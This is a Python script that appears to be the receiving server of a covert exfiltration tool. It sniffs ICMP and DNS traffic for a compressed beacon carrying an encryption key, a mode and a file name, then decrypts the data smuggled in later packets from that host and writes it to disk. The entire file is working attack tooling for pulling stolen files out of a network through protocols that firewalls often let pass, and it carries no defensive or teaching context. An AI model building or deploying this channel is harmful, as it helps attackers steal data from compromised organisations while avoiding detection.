#!/usr/bin/python
# Server side version of sender script, will auto-detect incoming beacon and exfil type
# Listen script should only terminated when manually killed or when providing SIGNINT

import os
import sys
import time
import random
import string
from smaz import decompress
from scapy.all import *
from simplecrypt import decrypt

def usage():
	print("[!] USAGE: python " + sys.argv[0] + " <beacon-key>")
	print("[!] EXAMPLE: python " + sys.argv[0] + " 5up3rs3cr3tk3y")

# Listen for beacon and extract file information and exfiltration mode from it
def listen(bk):
	beacon = ""
	print("[+] LISTENING FOR ICMP/DNS BEACON STRING: " + bk)
	while True:
		if bk not in beacon:
			pkt = sniff(filter="icmp or udp port 53", count=1)
			beacon = decompress(pkt[0].load)
		else:
			ip_src = str(pkt[0][IP].src)
			key = str(beacon.split(":")[1])
			mode = str(beacon.split(":")[2])
			if mode == "i":
				mode = "ICMP"
			elif mode == "d":
				mode = "DNS"
			file = str(beacon.split(":")[3])
			print("[+] BEACON RECEIVED FROM: " + ip_src)
			print("[+] RECEIVED ENCRYPTION KEY: " + key)
			print("[+] EXFIL MODE: " + mode)
			print("[+] WRITING FILE: " + file)
			break
	return key, file, mode, ip_src

# Begin file writing process based on mode received by listen function, decypts each packet and writes to file 
def write(key, file, mode, ip_src, bk):
	print("[+] STARTING DATA WRITING")
	try:
		with open(file, 'a+w') as a:
			if mode == "ICMP":
				while True:
					icmp_pkt = sniff(filter="icmp and host " + ip_src, count=1)
					data = icmp_pkt[0].load
					data = decrypt(key, data)
					if bk not in data:
						a.write(data)
						print("[+] APPENDING %s BYTES..." % str(len(data)))
					else:
						a.write(data[:-len(bk)])
						a.close()
						print("[+] FILE WRITTEN: " + file)
						break
			elif mode == "DNS":
				while True:
					dns_pkt = sniff(filter="udp port 53 and host " + ip_src, count=1)
					data = dns_pkt[0].load
					data = decrypt(key, data)
					if bk not in data:
						a.write(data)
						print("[+] APPENDING %s BYTES..." % str(len(data)))
					else:
						a.write(data[:-len(bk)])
						a.close()
						print("[+] FILE WRITTEN: " + file)
						break
	except:
		main()

# Main process execution, loops to allow multiple file writes
def main():
	try:
		bk = str(sys.argv[1])
		while True:
			key, file, mode, ip_src = listen(bk)
			write(key, file, mode, ip_src, bk)
	except Exception as e:
		usage()

if __name__=="__main__":
	main()